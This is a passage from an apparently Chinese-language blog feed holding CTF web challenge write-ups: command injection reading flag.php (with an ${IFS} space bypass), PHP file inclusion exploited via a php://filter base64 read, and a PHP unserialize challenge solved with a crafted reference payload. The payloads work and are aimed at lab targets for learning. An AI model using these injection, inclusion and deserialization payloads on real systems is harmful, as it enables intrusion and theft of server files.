rel="noopener">http://47.100.121.220:28005/</a></p><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>拿到题目应该可以看得出来这是一个命令执行的题目。</p><p>这里在提交框填什么都会重定向到05.php?ip=127.0.0.1</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/%E9%87%8D%E5%AE%9A%E5%90%91.png" alt=""></p><p>关键在重定向后的这个数据包，这里我们就可以命令执行了</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/pingls.png" alt=""></p><p>这里不能直接利用cat flag.php </p><p>这里我们利用 \${IFS} 绕过 得到flag</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/IFS.png" alt=""></p><p>原本以为是过滤了空格</p><p>后面甜哥告诉我是编码的问题 这里不需要利用 \${IFS} 绕过 也可以读取flag的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%20flag.php</span><br></pre></td></tr></table></figure><h2 id="06-100"><a href="#06-100" class="headerlink" title="06 100"></a>06 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006/06.php" target="_blank" rel="noopener">http://47.100.121.220:28006/06.php</a></p><h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include($_GET[&apos;file&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里我们可以看出这是一个文件包含的题目，在服务器应该存在一个flag.php文件</p><p>试图访问/flag.php是存在的，状态为200。</p><p>这样我们就可以利用文件包含来读flag.php的代码了</p><p>这里直接包含是不行的，要利用php的伪协议 php://filter 来读取</p><p>php伪协议可以参考我的博客</p><p><a href="https://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p><p>直接用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure><p>就可以得到base64加密的flag.php源码了,直接解密，得到flag</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/0606060606606.png" alt=""></p><h2 id="07-100"><a href="#07-100" class="headerlink" title="07 100"></a>07 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28007/" target="_blank" rel="noopener">http://47.100.121.220:28007/</a></p><h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>打开链接 直接得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    var $guess;</span><br><span class="line">    var $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if (isset($_GET[&apos;k&apos;])) &#123;</span><br><span class="line">    $k = $_GET[&apos;k&apos;];</span><br><span class="line"></span><br><span class="line">    $o = unserialize($k);</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;flag = $flag;</span><br><span class="line">        if ($o-&gt;flag === $o-&gt;guess) &#123;</span><br><span class="line">            echo &quot;Congratulation! &quot;.$o-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;wrong!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;wrong!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对源码进行分析，可以知道这是一个反序列化的题目，关键的判断在如下代码部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;flag = $flag;</span><br><span class="line">      if ($o-&gt;flag === $o-&gt;guess) &#123;</span><br><span class="line">          echo &quot;Congratulation! &quot;.$o-&gt;flag;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          echo &quot;wrong!!&quot;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>从代码的理解我们需要做到对象里的flag成员变量的值等于guess的成员变量的值</p><p>即 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;flag === $o-&gt;guess</span><br></pre></td></tr></table></figure><p>这里我们可以写一个1.php的序列化文件，使我们的类和对象符合题目中的条件，</p><p>再利用serialize()函数 序列化得到payload,再把payload赋值给k，由此得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class A &#123;</span><br><span class="line">    var $flag;</span><br><span class="line">    var $guess;</span><br><span class="line">    function A()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag=&amp;$this-&gt;guess;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new A());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/serializetest.png" alt=""></p><p>得到paylad</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:5:&quot;guess&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>赋值给k,得到flag</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/unserializectf.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;签到-50&quot;&gt;&lt;a href=&quot;#签到-50&quot; class=&quot;headerlink&quot; title=&quot;签到 50&quot;&gt;&lt;/a&gt;签到 50&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
</feed>
